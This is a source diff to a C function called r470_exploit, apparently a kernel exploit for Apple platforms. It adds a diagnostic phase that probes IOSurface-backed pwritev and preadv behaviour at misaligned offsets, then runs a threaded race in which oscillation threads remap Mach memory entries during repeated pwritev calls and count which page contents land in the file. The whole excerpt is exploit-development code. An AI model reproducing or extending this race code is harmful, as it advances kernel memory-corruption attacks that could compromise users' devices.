@@ -17433,28 +17433,97 @@ static void r470_exploit(void) {
         rlog("\n=== r470 done ===\n"); return;
     }
 
-    /* Phase 3: Diagnostic — test IOSurface + pwritev behavior */
+    /* Phase 3: Diagnostic — IOSurface + pwritev + preadv */
     rlog("\n  --- Phase 3: Diagnostic ---\n"); fflush(stdout);
     {
+        /* Check IOSurface alloc size and region */
+        size_t iosurf_alloc = IOSurfaceGetAllocSize(surf);
+        uint32_t iosurf_seed = IOSurfaceGetSeed(surf);
+        rlog("    IOSurface alloc=%zu seed=%u\n", iosurf_alloc, iosurf_seed);
+
+        /* Test pwritev aligned */
         struct iovec dv = { surf_base, R470_SURF_SZ };
         errno = 0;
         ssize_t dw = pwritev(fd, &dv, 1, 0);
-        rlog("    aligned full: w=%zd errno=%d\n", dw, errno);
+        rlog("    pwritev aligned: w=%zd errno=%d\n", dw, errno);
 
+        /* Test pwritev misaligned 0x3f00 */
         struct iovec dv2 = {
             (void *)((uintptr_t)surf_base + R470_IOV_OFFSET), R470_IOV_LEN
         };
         errno = 0;
         ssize_t dw2 = pwritev(fd, &dv2, 1, R470_IOV_OFFSET);
-        rlog("    misaligned 0x3f00: w=%zd errno=%d\n", dw2, errno);
+        rlog("    pwritev misaligned: w=%zd errno=%d\n", dw2, errno);
 
+        /* Test preadv: read from file into IOSurface */
+        memset(surf_base, 0xFF, R470_SURF_SZ);
+        uint8_t fbuf[R470_PAGE_SZ];
+        memset(fbuf, 0x55, R470_PAGE_SZ);
+        pwrite(fd, fbuf, R470_PAGE_SZ, 0);
+        struct iovec rv = { surf_base, R470_PAGE_SZ };
+        errno = 0;
+        ssize_t dr = preadv(fd, &rv, 1, 0);
+        rlog("    preadv aligned: r=%zd errno=%d surf[0]=%02x\n",
+             dr, errno, *(uint8_t *)surf_base);
+        memset(surf_base, 0xAA, R470_SURF_SZ);
+
+        /* File content check */
         uint8_t chk[16];
-        pread(fd, chk, 16, 0);
-        rlog("    file@0: %02x %02x %02x %02x\n", chk[0], chk[1], chk[2], chk[3]);
         pread(fd, chk, 16, R470_IOV_OFFSET);
         rlog("    file@0x3f00: %02x %02x %02x %02x\n", chk[0], chk[1], chk[2], chk[3]);
         pread(fd, chk, 16, 0x4000);
         rlog("    file@0x4000: %02x %02x %02x %02x\n", chk[0], chk[1], chk[2], chk[3]);
+
+        /* Prep file: write 0xFF to entire file for race detection */
+        memset(fbuf, 0xFF, R470_PAGE_SZ);
+        pwrite(fd, fbuf, R470_PAGE_SZ, 0);
+        pwrite(fd, fbuf, R470_PAGE_SZ, R470_PAGE_SZ);
+
+        /* Quick oscillation race test (500 iters, 2 threads) */
+        rlog("    Quick race: 500 pwritev + 2 osc threads...\n"); fflush(stdout);
+        struct r470_shared qctx;
+        memset(&qctx, 0, sizeof(qctx));
+        qctx.target = (mach_vm_address_t)(uintptr_t)surf_base;
+        qctx.target_size = R470_SURF_SZ;
+        qctx.surf_entry = surf_entry;
+        /* Use a simple 2-page anonymous alloc as search entry */
+        mach_vm_address_t qremap = 0;
+        mach_vm_allocate(mach_task_self(), &qremap, R470_SURF_SZ, VM_FLAGS_ANYWHERE);
+        memset((void *)(uintptr_t)qremap, 0xBB, R470_SURF_SZ);
+        ((uint8_t *)(uintptr_t)qremap)[0] = 0xBB; /* fault it */
+        ((uint8_t *)(uintptr_t)(qremap + R470_PAGE_SZ))[0] = 0xCC;
+        memory_object_size_t qmsz = R470_SURF_SZ;
+        mach_port_t qentry = MACH_PORT_NULL;
+        mach_make_memory_entry_64(mach_task_self(), &qmsz, qremap,
+            VM_PROT_READ | VM_PROT_WRITE, &qentry, MACH_PORT_NULL);
+        qctx.search_entry = qentry;
+        pthread_t qt1, qt2;
+        pthread_create(&qt1, NULL, r470_osc_thread, &qctx);
+        pthread_create(&qt2, NULL, r470_osc_thread, &qctx);
+        qctx.go = 1; __sync_synchronize();
+        int qsurf = 0, qremap_v = 0, qeinval = 0, qother = 0;
+        for (int qi = 0; qi < 500; qi++) {
+            struct iovec qiov = {
+                (void *)((uintptr_t)surf_base + R470_IOV_OFFSET), R470_IOV_LEN
+            };
+            errno = 0;
+            ssize_t qw = pwritev(fd, &qiov, 1, R470_IOV_OFFSET);
+            if (qw == -1 && errno == EINVAL) qeinval++;
+            else if (qw == (ssize_t)R470_IOV_LEN) {
+                uint8_t qchk;
+                pread(fd, &qchk, 1, R470_IOV_OFFSET);
+                if (qchk == 0xAA) qsurf++;
+                else if (qchk == 0xBB || qchk == 0xCC) qremap_v++;
+                else qother++;
+            } else qother++;
+        }
+        qctx.stop = 1; __sync_synchronize();
+        pthread_join(qt1, NULL); pthread_join(qt2, NULL);
+        rlog("    Quick: surf=%d remap=%d einval=%d other=%d osc=%d\n",
+             qsurf, qremap_v, qeinval, qother, qctx.remap_count);
+        mach_port_deallocate(mach_task_self(), qentry);
+        mach_vm_deallocate(mach_task_self(), qremap, R470_SURF_SZ);
+        memset(surf_base, 0xAA, R470_SURF_SZ);
     }
 
     /* Phase 4: Search mapping (32 MiB to avoid jetsam) */
